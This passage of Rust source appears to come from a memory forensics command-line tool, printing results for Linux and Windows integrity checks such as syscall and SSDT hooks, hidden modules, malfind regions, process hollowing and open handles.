                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,comm,fd,path,inode,pos");
            for f in fds {
                let inode_str = f.inode.map_or_else(|| "-".to_string(), |i| format!("{i}"));
                let escaped = f.path.replace('"', "\"\"");
                println!(
                    "{},{},{},\"{}\",{},{}",
                    f.pid, f.comm, f.fd, escaped, inode_str, f.pos
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — environment variables
// ---------------------------------------------------------------------------

fn print_envvars(vars: &[memf_linux::EnvVarInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "Process", "Key", "Value"]);
            for v in vars {
                table.add_row(vec![
                    format!("{}", v.pid),
                    v.comm.clone(),
                    v.key.clone(),
                    v.value.clone(),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} environment variables", vars.len());
        }
        OutputFormat::Json => {
            for v in vars {
                let json = serde_json::json!({
                    "pid": v.pid,
                    "comm": v.comm,
                    "key": v.key,
                    "value": v.value,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,comm,key,value");
            for v in vars {
                let escaped_val = v.value.replace('"', "\"\"");
                println!("{},{},{},\"{}\"", v.pid, v.comm, v.key, escaped_val);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — malfind
// ---------------------------------------------------------------------------

fn print_malfind(findings: &[memf_linux::MalfindInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "Process", "Start", "End", "Flags", "Reason"]);
            for f in findings {
                table.add_row(vec![
                    format!("{}", f.pid),
                    f.comm.clone(),
                    format!("{:#x}", f.start),
                    format!("{:#x}", f.end),
                    format!("{}", f.flags),
                    f.reason.clone(),
                ]);
            }
            println!("{table}");
            if findings.is_empty() {
                println!("\nNo suspicious memory regions found.");
            } else {
                println!("\nTotal: {} suspicious regions", findings.len());
            }
        }
        OutputFormat::Json => {
            for f in findings {
                let hex_header: String = f.header_bytes.iter().fold(String::new(), |mut s, b| {
                    write!(s, "{b:02x}").unwrap();
                    s
                });
                let json = serde_json::json!({
                    "pid": f.pid,
                    "comm": f.comm,
                    "start": format!("{:#x}", f.start),
                    "end": format!("{:#x}", f.end),
                    "flags": format!("{}", f.flags),
                    "reason": f.reason,
                    "header_hex": hex_header,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,comm,start,end,flags,reason,header_hex");
            for f in findings {
                let hex_header: String = f.header_bytes.iter().fold(String::new(), |mut s, b| {
                    write!(s, "{b:02x}").unwrap();
                    s
                });
                let escaped = f.reason.replace('"', "\"\"");
                println!(
                    "{},{},{:#x},{:#x},{},\"{}\",{}",
                    f.pid, f.comm, f.start, f.end, f.flags, escaped, hex_header
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — mounted filesystems
// ---------------------------------------------------------------------------

fn print_mounts(mounts: &[memf_linux::MountInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["Device", "Mount Point", "FS Type"]);
            for m in mounts {
                table.add_row(vec![
                    m.dev_name.clone(),
                    m.mount_point.clone(),
                    m.fs_type.clone(),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} mounts", mounts.len());
        }
        OutputFormat::Json => {
            for m in mounts {
                let json = serde_json::json!({
                    "dev_name": m.dev_name,
                    "mount_point": m.mount_point,
                    "fs_type": m.fs_type,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("dev_name,mount_point,fs_type");
            for m in mounts {
                let escaped_dev = m.dev_name.replace('"', "\"\"");
                let escaped_mp = m.mount_point.replace('"', "\"\"");
                println!("\"{}\",\"{}\",{}", escaped_dev, escaped_mp, m.fs_type);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — syscall table
// ---------------------------------------------------------------------------

fn print_syscalls(entries: &[memf_linux::SyscallInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["NR", "Handler", "Hooked"]);
            for e in entries {
                table.add_row(vec![
                    format!("{}", e.number),
                    format!("{:#x}", e.handler),
                    if e.hooked { "YES" } else { "-" }.to_string(),
                ]);
            }
            println!("{table}");
            let hooked_count = entries.iter().filter(|e| e.hooked).count();
            println!(
                "\nTotal: {} syscalls ({} hooked)",
                entries.len(),
                hooked_count
            );
        }
        OutputFormat::Json => {
            for e in entries {
                let json = serde_json::json!({
                    "number": e.number,
                    "handler": format!("{:#x}", e.handler),
                    "hooked": e.hooked,
                    "expected_name": e.expected_name,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("number,handler,hooked,expected_name");
            for e in entries {
                let name = e.expected_name.as_deref().unwrap_or("-");
                println!("{},{:#x},{},{}", e.number, e.handler, e.hooked, name);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — bash history
// ---------------------------------------------------------------------------

fn print_bash_history(entries: &[memf_linux::BashHistoryInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "COMM", "INDEX", "TIMESTAMP", "COMMAND"]);
            for e in entries {
                table.add_row(vec![
                    format!("{}", e.pid),
                    e.comm.clone(),
                    format!("{}", e.index),
                    e.timestamp
                        .map_or_else(|| "-".to_string(), |ts| ts.to_string()),
                    e.command.clone(),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} history entries", entries.len());
        }
        OutputFormat::Json => {
            for e in entries {
                let json = serde_json::json!({
                    "pid": e.pid,
                    "comm": e.comm,
                    "index": e.index,
                    "timestamp": e.timestamp,
                    "command": e.command,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,comm,index,timestamp,command");
            for e in entries {
                let ts = e
                    .timestamp
                    .map_or_else(|| "-".to_string(), |ts| ts.to_string());
                println!("{},{},{},{},{}", e.pid, e.comm, e.index, ts, e.command);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — psxview
// ---------------------------------------------------------------------------

fn print_psxview(entries: &[memf_linux::PsxViewInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "COMM", "TASK_LIST", "PID_HASH"]);
            for e in entries {
                table.add_row(vec![
                    format!("{}", e.pid),
                    e.comm.clone(),
                    if e.in_task_list { "YES" } else { "NO" }.to_string(),
                    if e.in_pid_hash { "YES" } else { "NO" }.to_string(),
                ]);
            }
            println!("{table}");
            let hidden = entries
                .iter()
                .filter(|e| e.in_task_list != e.in_pid_hash)
                .count();
            println!("\nTotal: {} processes ({} hidden)", entries.len(), hidden);
        }
        OutputFormat::Json => {
            for e in entries {
                let json = serde_json::json!({
                    "pid": e.pid,
                    "comm": e.comm,
                    "in_task_list": e.in_task_list,
                    "in_pid_hash": e.in_pid_hash,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,comm,in_task_list,in_pid_hash");
            for e in entries {
                println!("{},{},{},{}", e.pid, e.comm, e.in_task_list, e.in_pid_hash);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — TTY check
// ---------------------------------------------------------------------------

fn print_tty_check(entries: &[memf_linux::TtyCheckInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["DRIVER", "OPERATION", "HANDLER", "HOOKED"]);
            for e in entries {
                table.add_row(vec![
                    e.name.clone(),
                    e.operation.clone(),
                    format!("{:#x}", e.handler),
                    if e.hooked { "YES" } else { "NO" }.to_string(),
                ]);
            }
            println!("{table}");
            let hooked = entries.iter().filter(|e| e.hooked).count();
            println!(
                "\nTotal: {} TTY operations ({} hooked)",
                entries.len(),
                hooked
            );
        }
        OutputFormat::Json => {
            for e in entries {
                let json = serde_json::json!({
                    "name": e.name,
                    "operation": e.operation,
                    "handler": format!("{:#x}", e.handler),
                    "hooked": e.hooked,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("name,operation,handler,hooked");
            for e in entries {
                println!("{},{},{:#x},{}", e.name, e.operation, e.handler, e.hooked);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — kernel inline hooks
// ---------------------------------------------------------------------------

fn print_check_hooks(entries: &[memf_linux::KernelHookInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "SYMBOL",
                "ADDRESS",
                "HOOK_TYPE",
                "TARGET",
                "SUSPICIOUS",
            ]);
            for e in entries {
                table.add_row(vec![
                    e.symbol.clone(),
                    format!("{:#x}", e.address),
                    e.hook_type.clone(),
                    e.target
                        .map_or_else(|| "-".to_string(), |t| format!("{t:#x}")),
                    if e.suspicious { "YES" } else { "NO" }.to_string(),
                ]);
            }
            println!("{table}");
            let suspicious = entries.iter().filter(|e| e.suspicious).count();
            println!(
                "\nTotal: {} functions ({} suspicious)",
                entries.len(),
                suspicious
            );
        }
        OutputFormat::Json => {
            for e in entries {
                let json = serde_json::json!({
                    "symbol": e.symbol,
                    "address": format!("{:#x}", e.address),
                    "hook_type": e.hook_type,
                    "target": e.target.map(|t| format!("{t:#x}")),
                    "suspicious": e.suspicious,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("symbol,address,hook_type,target,suspicious");
            for e in entries {
                let target = e
                    .target
                    .map_or_else(|| "-".to_string(), |t| format!("{t:#x}"));
                println!(
                    "{},{:#x},{},{},{}",
                    e.symbol, e.address, e.hook_type, target, e.suspicious
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — ELF info
// ---------------------------------------------------------------------------

fn print_elfinfo(entries: &[memf_linux::ElfInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["PID", "COMM", "VMA_START", "TYPE", "MACHINE", "ENTRY"]);
            for e in entries {
                table.add_row(vec![
                    format!("{}", e.pid),
                    e.comm.clone(),
                    format!("{:#x}", e.vma_start),
                    format!("{:?}", e.elf_type),
                    format!("{}", e.machine),
                    format!("{:#x}", e.entry_point),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} ELF headers", entries.len());
        }
        OutputFormat::Json => {
            for e in entries {
                let json = serde_json::json!({
                    "pid": e.pid,
                    "comm": e.comm,
                    "vma_start": format!("{:#x}", e.vma_start),
                    "elf_type": format!("{:?}", e.elf_type),
                    "machine": e.machine,
                    "entry_point": format!("{:#x}", e.entry_point),
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,comm,vma_start,elf_type,machine,entry_point");
            for e in entries {
                println!(
                    "{},{},{:#x},{:?},{},{:#x}",
                    e.pid, e.comm, e.vma_start, e.elf_type, e.machine, e.entry_point
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — hidden modules
// ---------------------------------------------------------------------------

fn print_check_modules(entries: &[memf_linux::HiddenModuleInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["NAME", "BASE_ADDR", "SIZE", "MODULES_LIST", "SYSFS"]);
            for e in entries {
                table.add_row(vec![
                    e.name.clone(),
                    format!("{:#x}", e.base_addr),
                    format!("{}", e.size),
                    if e.in_modules_list { "YES" } else { "NO" }.to_string(),
                    if e.in_sysfs { "YES" } else { "NO" }.to_string(),
                ]);
            }
            println!("{table}");
            let hidden = entries
                .iter()
                .filter(|e| e.in_modules_list != e.in_sysfs)
                .count();
            println!("\nTotal: {} modules ({} hidden)", entries.len(), hidden);
        }
        OutputFormat::Json => {
            for e in entries {
                let json = serde_json::json!({
                    "name": e.name,
                    "base_addr": format!("{:#x}", e.base_addr),
                    "size": e.size,
                    "in_modules_list": e.in_modules_list,
                    "in_sysfs": e.in_sysfs,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("name,base_addr,size,in_modules_list,in_sysfs");
            for e in entries {
                println!(
                    "{},{:#x},{},{},{}",
                    e.name, e.base_addr, e.size, e.in_modules_list, e.in_sysfs
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// cmd_system — kernel modules/drivers + system-level artifacts
// ---------------------------------------------------------------------------

#[allow(clippy::too_many_arguments)]
fn cmd_system(
    dump: &Path,
    symbols_path: Option<&Path>,
    output: OutputFormat,
    cr3_override: Option<u64>,
    mounts: bool,
    raw_fallback: bool,
) -> Result<()> {
    let (ctx, reader) = setup_analysis(dump, symbols_path, cr3_override, raw_fallback)?;
    match ctx.os {
        OsProfile::Linux => {
            let mods = memf_linux::modules::walk_modules(&reader)
                .context("failed to walk Linux modules")?;
            print_linux_modules(&mods, output);
            if mounts {
                let fs = memf_linux::fs::walk_filesystems(&reader)
                    .context("failed to walk Linux mounted filesystems")?;
                println!();
                print_mounts(&fs, output);
            }
        }
        OsProfile::Windows => {
            if mounts {
                anyhow::bail!("--mounts is only available for Linux memory dumps");
            }
            let mod_list = ctx
                .ps_loaded_module_list
                .context("missing PsLoadedModuleList; provide via symbols or dump metadata")?;
            let drivers = memf_windows::driver::walk_drivers(&reader, mod_list)
                .context("failed to walk Windows drivers")?;
            print_windows_drivers(&drivers, output);
        }
        OsProfile::MacOs => anyhow::bail!("macOS module walking not yet supported"),
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// cmd_check — integrity and tampering detection
// ---------------------------------------------------------------------------

#[allow(
    clippy::too_many_arguments,
    clippy::fn_params_excessive_bools,
    clippy::too_many_lines
)]
fn cmd_check(
    dump: &Path,
    symbols_path: Option<&Path>,
    output: OutputFormat,
    cr3_override: Option<u64>,
    syscalls: bool,
    hooks: bool,
    irp: bool,
    ssdt: bool,
    callbacks: bool,
    malfind: bool,
    psxview: bool,
    tty: bool,
    modules: bool,
    ldrmodules: bool,
    hollowing: bool,
    all: bool,
    pid_filter: Option<u64>,
    raw_fallback: bool,
) -> Result<()> {
    if !(all
        || syscalls
        || hooks
        || irp
        || ssdt
        || callbacks
        || malfind
        || psxview
        || tty
        || modules
        || ldrmodules
        || hollowing)
    {
        anyhow::bail!(
            "no check flags specified. Available checks:\n  \
             --all (run all platform-appropriate checks)\n  \
             Linux:   --syscalls  --hooks  --malfind  --psxview  --tty  --modules\n  \
             Windows: --ssdt  --callbacks  --irp  --malfind  --ldrmodules  --hollowing"
        );
    }

    let (ctx, reader) = setup_analysis(dump, symbols_path, cr3_override, raw_fallback)?;
    match ctx.os {
        OsProfile::Linux => {
            // Expand --all into platform-appropriate flags
            let syscalls = syscalls || all;
            let hooks = hooks || all;
            let malfind = malfind || all;
            let psxview = psxview || all;
            let tty = tty || all;
            let modules = modules || all;

            // Cross-OS validation: bail on Windows-only checks
            if irp {
                anyhow::bail!("--irp is only available for Windows memory dumps");
            }
            if ssdt {
                anyhow::bail!("--ssdt is only available for Windows memory dumps");
            }
            if callbacks {
                anyhow::bail!("--callbacks is only available for Windows memory dumps");
            }
            if ldrmodules {
                anyhow::bail!("--ldrmodules is only available for Windows memory dumps");
            }
            if hollowing {
                anyhow::bail!("--hollowing is only available for Windows memory dumps");
            }
            if syscalls {
                let entries = memf_linux::syscalls::check_syscall_table(&reader)
                    .context("failed to check syscall table")?;
                print_syscalls(&entries, output);
            }
            if hooks {
                let entries = memf_linux::check_hooks::check_inline_hooks(&reader)
                    .context("failed to check inline hooks")?;
                print_check_hooks(&entries, output);
            }
            if malfind {
                let mut findings = memf_linux::malfind::scan_malfind(&reader)
                    .context("failed to scan for suspicious memory regions")?;
                if let Some(pid) = pid_filter {
                    findings.retain(|f| f.pid == pid);
                    if findings.is_empty() {
                        eprintln!("warning: no suspicious regions found for PID {pid}");
                    }
                }
                print_malfind(&findings, output);
            }
            if psxview {
                let entries =
                    memf_linux::psxview::walk_psxview(&reader).context("failed to run psxview")?;
                print_psxview(&entries, output);
            }
            if tty {
                let entries = memf_linux::tty_check::check_tty_hooks(&reader)
                    .context("failed to check TTY hooks")?;
                print_tty_check(&entries, output);
            }
            if modules {
                let entries = memf_linux::check_modules::check_hidden_modules(&reader)
                    .context("failed to check hidden modules")?;
                print_check_modules(&entries, output);
            }
        }
        OsProfile::Windows => {
            // Expand --all into platform-appropriate flags
            let irp = irp || all;
            let ssdt = ssdt || all;
            let callbacks = callbacks || all;
            let malfind = malfind || all;
            let ldrmodules = ldrmodules || all;
            let hollowing = hollowing || all;

            // Cross-OS validation: bail on Linux-only checks
            if syscalls {
                anyhow::bail!("--syscalls is only available for Linux memory dumps");
            }
            if hooks {
                anyhow::bail!("--hooks is only available for Linux memory dumps");
            }
            if psxview {
                anyhow::bail!("--psxview is only available for Linux memory dumps");
            }
            if tty {
                anyhow::bail!("--tty is only available for Linux memory dumps");
            }
            if modules {
                anyhow::bail!("--modules is only available for Linux memory dumps");
            }
            if ssdt {
                let mod_list = ctx
                    .ps_loaded_module_list
                    .context("missing PsLoadedModuleList for SSDT check")?;
                let drivers = memf_windows::driver::walk_drivers(&reader, mod_list)
                    .context("failed to walk Windows drivers for SSDT check")?;
                let ssdt_vaddr = reader
                    .symbols()
                    .symbol_address("KeServiceDescriptorTable")
                    .context("missing KeServiceDescriptorTable symbol for SSDT check")?;
                let hook_entries =
                    memf_windows::ssdt::check_ssdt_hooks(&reader, ssdt_vaddr, &drivers)
                        .context("failed to check SSDT hooks")?;
                print_ssdt_hooks(&hook_entries, output);
            }
            if callbacks {
                let mod_list = ctx
                    .ps_loaded_module_list
                    .context("missing PsLoadedModuleList for callback check")?;
                let drivers = memf_windows::driver::walk_drivers(&reader, mod_list)
                    .context("failed to walk Windows drivers for callback check")?;
                let proc_notify = reader
                    .symbols()
                    .symbol_address("PspCreateProcessNotifyRoutine")
                    .context("missing PspCreateProcessNotifyRoutine symbol")?;
                let thread_notify = reader
                    .symbols()
                    .symbol_address("PspCreateThreadNotifyRoutine")
                    .context("missing PspCreateThreadNotifyRoutine symbol")?;
                let image_notify = reader
                    .symbols()
                    .symbol_address("PspLoadImageNotifyRoutine")
                    .context("missing PspLoadImageNotifyRoutine symbol")?;
                let cbs = memf_windows::callbacks::walk_kernel_callbacks(
                    &reader,
                    proc_notify,
                    thread_notify,
                    image_notify,
                    &drivers,
                )
                .context("failed to enumerate kernel callbacks")?;
                print_callbacks(&cbs, output);
            }
            if irp {
                let mod_list = ctx
                    .ps_loaded_module_list
                    .context("missing PsLoadedModuleList for IRP hook check")?;
                let drivers = memf_windows::driver::walk_drivers(&reader, mod_list)
                    .context("failed to walk Windows drivers for IRP hook check")?;
                let root_dir_sym = reader
                    .symbols()
                    .symbol_address("ObpRootDirectoryObject")
                    .context("missing ObpRootDirectoryObject symbol for IRP hook check")?;
                let ptr_bytes = reader
                    .read_bytes(root_dir_sym, 8)
                    .context("failed to dereference ObpRootDirectoryObject")?;
                let root_dir_ptr = u64::from_le_bytes(ptr_bytes[..8].try_into().unwrap());
                let driver_addrs =
                    memf_windows::object_directory::walk_driver_objects(&reader, root_dir_ptr)
                        .context("failed to walk \\Driver object directory")?;
                let mut all_hooks = Vec::new();
                for &drv_addr in &driver_addrs {
                    if let Ok(hooks) =
                        memf_windows::driver::check_irp_hooks(&reader, drv_addr, &drivers)
                    {
                        all_hooks.extend(hooks);
                    }
                }
                print_irp_hooks(&all_hooks, output);
            }
            if malfind {
                let ps_head = ctx
                    .ps_active_process_head
                    .context("missing PsActiveProcessHead for Windows malfind")?;
                let mut findings = memf_windows::vad::walk_malfind(&reader, ps_head)
                    .context("failed to scan Windows memory for suspicious regions")?;
                if let Some(pid) = pid_filter {
                    findings.retain(|f| f.pid == pid);
                    if findings.is_empty() {
                        eprintln!("warning: no suspicious regions found for PID {pid}");
                    }
                }
                print_windows_malfind(&findings, output);
            }
            if ldrmodules {
                let ps_head = ctx
                    .ps_active_process_head
                    .context("missing PsActiveProcessHead for LdrModules check")?;
                let procs = memf_windows::process::walk_processes(&reader, ps_head)
                    .context("failed to walk processes for LdrModules")?;
                let mut all_mods = Vec::new();
                for proc in &procs {
                    if proc.peb_addr == 0 {
                        continue;
                    }
                    if let Some(pid) = pid_filter {
                        if proc.pid != pid {
                            continue;
                        }
                    }
                    // Switch to process address space (user-mode PEB)
                    let proc_reader = reader.with_cr3(proc.cr3);
                    if let Ok(mods) =
                        memf_windows::dll::walk_ldr_modules(&proc_reader, proc.peb_addr)
                    {
                        for m in mods {
                            all_mods.push((proc.pid, proc.image_name.clone(), m));
                        }
                    }
                }
                if pid_filter.is_some() && all_mods.is_empty() {
                    eprintln!(
                        "warning: no LDR modules found for PID {}",
                        pid_filter.unwrap()
                    );
                }
                print_ldr_modules(&all_mods, output);
            }
            if hollowing {
                let ps_head = ctx
                    .ps_active_process_head
                    .context("missing PsActiveProcessHead for hollowing check")?;
                let mut findings = memf_windows::hollowing::check_hollowing(&reader, ps_head)
                    .context("failed to check for process hollowing")?;
                if let Some(pid) = pid_filter {
                    findings.retain(|f| f.pid == pid);
                    if findings.is_empty() {
                        eprintln!("warning: no hollowing findings for PID {pid}");
                    }
                }
                print_hollowing(&findings, output);
            }
        }
        OsProfile::MacOs => anyhow::bail!("macOS integrity checks not yet supported"),
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// cmd_handles — open handles (Linux FDs, Windows handle table)
// ---------------------------------------------------------------------------

fn cmd_handles(
    dump: &Path,
    symbols_path: Option<&Path>,
    output: OutputFormat,
    cr3_override: Option<u64>,
    pid_filter: Option<u64>,
    raw_fallback: bool,
) -> Result<()> {
    let (ctx, reader) = setup_analysis(dump, symbols_path, cr3_override, raw_fallback)?;
    match ctx.os {
        OsProfile::Linux => {
            let mut fds = memf_linux::files::walk_files(&reader)
                .context("failed to walk Linux file descriptors")?;
            if let Some(pid) = pid_filter {
                fds.retain(|f| f.pid == pid);
                if fds.is_empty() {
                    eprintln!("warning: no file descriptors found for PID {pid}");
                }
            }
            print_file_descriptors(&fds, output);
        }
        OsProfile::Windows => {
            let ps_head = ctx
                .ps_active_process_head
                .context("missing PsActiveProcessHead for handle walking")?;
            let mut handles = memf_windows::handles::walk_handles(&reader, ps_head)
                .context("failed to walk Windows handle tables")?;
            if let Some(pid) = pid_filter {
                handles.retain(|h| h.pid == pid);
                if handles.is_empty() {
                    eprintln!("warning: no handles found for PID {pid}");
                }
            }
            print_handles(&handles, output);
        }
        OsProfile::MacOs => anyhow::bail!("macOS handle walking not yet supported"),
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Output formatters — handles
// ---------------------------------------------------------------------------

fn print_handles(handles: &[memf_windows::WinHandleInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "PID",
                "Process",
                "Handle",
                "Type",
                "Object",
                "GrantedAccess",
            ]);
            for h in handles {
                table.add_row(vec![
                    format!("{}", h.pid),
                    h.image_name.clone(),
                    format!("{:#x}", h.handle_value),
                    h.object_type.clone(),
                    format!("{:#018x}", h.object_addr),
                    format!("{:#010x}", h.granted_access),
                ]);
            }
            println!("{table}");
            println!("\nTotal: {} handles", handles.len());
        }
        OutputFormat::Json => {
            for h in handles {
                let json = serde_json::json!({
                    "pid": h.pid,
                    "image_name": h.image_name,
                    "handle_value": h.handle_value,
                    "object_type": h.object_type,
                    "object_addr": format!("{:#x}", h.object_addr),
                    "granted_access": format!("{:#x}", h.granted_access),
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("pid,image_name,handle_value,object_type,object_addr,granted_access");
            for h in handles {
                println!(
                    "{},{},{:#x},{},{:#x},{:#x}",
                    h.pid,
                    h.image_name,
                    h.handle_value,
                    h.object_type,
                    h.object_addr,
                    h.granted_access,
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — SSDT hooks
// ---------------------------------------------------------------------------

fn print_ssdt_hooks(hooks: &[memf_windows::WinSsdtHookInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let suspicious: Vec<_> = hooks.iter().filter(|h| h.suspicious).collect();
            if suspicious.is_empty() {
                println!(
                    "\nSSDT: {} entries checked, no hooks detected.",
                    hooks.len()
                );
            } else {
                let mut table = Table::new();
                table.load_preset(UTF8_FULL_CONDENSED);
                table.set_header(vec!["Index", "Target", "Module", "Suspicious"]);
                for h in &suspicious {
                    table.add_row(vec![
                        format!("{}", h.index),
                        format!("{:#x}", h.target_addr),
                        h.target_module
                            .as_deref()
                            .unwrap_or("<unknown>")
                            .to_string(),
                        "YES".to_string(),
                    ]);
                }
                println!("{table}");
                println!(
                    "\nSSDT: {} entries checked, {} suspicious hooks",
                    hooks.len(),
                    suspicious.len()
                );
            }
        }
        OutputFormat::Json => {
            for h in hooks {
                let json = serde_json::json!({
                    "index": h.index,
                    "target_addr": format!("{:#x}", h.target_addr),
                    "target_module": h.target_module,
                    "suspicious": h.suspicious,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("index,target_addr,target_module,suspicious");
            for h in hooks {
                println!(
                    "{},{:#x},{},{}",
                    h.index,
                    h.target_addr,
                    h.target_module.as_deref().unwrap_or(""),
                    h.suspicious
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — IRP dispatch hooks
// ---------------------------------------------------------------------------

fn print_irp_hooks(hooks: &[memf_windows::WinIrpHookInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let suspicious: Vec<_> = hooks.iter().filter(|h| h.suspicious).collect();
            if suspicious.is_empty() {
                println!(
                    "\nIRP dispatch: {} entries checked across all drivers, no hooks detected.",
                    hooks.len()
                );
            } else {
                let mut table = Table::new();
                table.load_preset(UTF8_FULL_CONDENSED);
                table.set_header(vec![
                    "Driver",
                    "IRP Index",
                    "IRP Name",
                    "Target",
                    "Module",
                    "Suspicious",
                ]);
                for h in &suspicious {
                    table.add_row(vec![
                        h.driver_name.clone(),
                        format!("{}", h.irp_index),
                        h.irp_name.clone(),
                        format!("{:#x}", h.target_addr),
                        h.target_module
                            .as_deref()
                            .unwrap_or("<unknown>")
                            .to_string(),
                        "YES".to_string(),
                    ]);
                }
                println!("{table}");
                println!(
                    "\nIRP dispatch: {} entries checked, {} suspicious hooks",
                    hooks.len(),
                    suspicious.len()
                );
            }
        }
        OutputFormat::Json => {
            for h in hooks {
                let json = serde_json::json!({
                    "driver_name": h.driver_name,
                    "driver_obj_addr": format!("{:#x}", h.driver_obj_addr),
                    "irp_index": h.irp_index,
                    "irp_name": h.irp_name,
                    "target_addr": format!("{:#x}", h.target_addr),
                    "target_module": h.target_module,
                    "suspicious": h.suspicious,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("driver_name,driver_obj_addr,irp_index,irp_name,target_addr,target_module,suspicious");
            for h in hooks {
                println!(
                    "{},{:#x},{},{},{:#x},{},{}",
                    h.driver_name,
                    h.driver_obj_addr,
                    h.irp_index,
                    h.irp_name,
                    h.target_addr,
                    h.target_module.as_deref().unwrap_or(""),
                    h.suspicious
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — kernel callbacks
// ---------------------------------------------------------------------------

fn print_callbacks(cbs: &[memf_windows::WinCallbackInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec!["Type", "Index", "Address", "Module"]);
            for cb in cbs {
                table.add_row(vec![
                    cb.callback_type.clone(),
                    format!("{}", cb.index),
                    format!("{:#x}", cb.address),
                    cb.owning_module
                        .as_deref()
                        .unwrap_or("<unknown>")
                        .to_string(),
                ]);
            }
            println!("{table}");
            let unknown = cbs.iter().filter(|c| c.owning_module.is_none()).count();
            if unknown > 0 {
                println!(
                    "\nTotal: {} callbacks ({} from unknown modules — possible rootkit)",
                    cbs.len(),
                    unknown
                );
            } else {
                println!("\nTotal: {} callbacks", cbs.len());
            }
        }
        OutputFormat::Json => {
            for cb in cbs {
                let json = serde_json::json!({
                    "callback_type": cb.callback_type,
                    "index": cb.index,
                    "address": format!("{:#x}", cb.address),
                    "owning_module": cb.owning_module,
                });
                println!("{}", serde_json::to_string(&json).unwrap_or_default());
            }
        }
        OutputFormat::Csv => {
            println!("callback_type,index,address,owning_module");
            for cb in cbs {
                println!(
                    "{},{},{:#x},{}",
                    cb.callback_type,
                    cb.index,
                    cb.address,
                    cb.owning_module.as_deref().unwrap_or("")
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Output formatters — Windows VAD tree
// ---------------------------------------------------------------------------

fn print_windows_vads(vads: &[memf_windows::WinVadInfo], output: OutputFormat) {
    match output {
        OutputFormat::Table => {
            let mut table = Table::new();
            table.load_preset(UTF8_FULL_CONDENSED);
            table.set_header(vec![
                "PID",
